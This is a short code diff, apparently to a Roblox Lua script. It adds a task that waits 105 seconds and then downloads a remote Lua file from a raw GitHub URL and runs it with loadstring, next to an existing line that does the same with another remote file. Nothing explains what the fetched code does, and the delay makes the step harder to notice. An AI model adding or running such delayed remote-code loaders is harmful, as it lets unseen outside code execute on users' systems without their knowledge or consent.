@@ -15,3 +15,8 @@ task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/NEWOP.github.io/refs/heads/main/erj.lua"))()
 end)
 
+
+task.spawn(function()
+    task.wait(105) -- Wait 105 seconds before executing
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
+end)
